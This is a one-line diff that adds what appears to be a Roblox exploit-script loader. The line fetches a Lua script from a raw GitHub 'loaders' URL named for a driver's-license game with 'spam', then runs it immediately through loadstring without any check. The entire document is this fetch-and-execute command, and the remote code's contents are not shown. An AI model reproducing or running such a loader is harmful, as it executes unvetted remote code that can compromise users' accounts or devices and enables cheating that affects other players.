@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/get-your-driver-s-license-spam0-86g7mpkegx8qkw.lua"))()
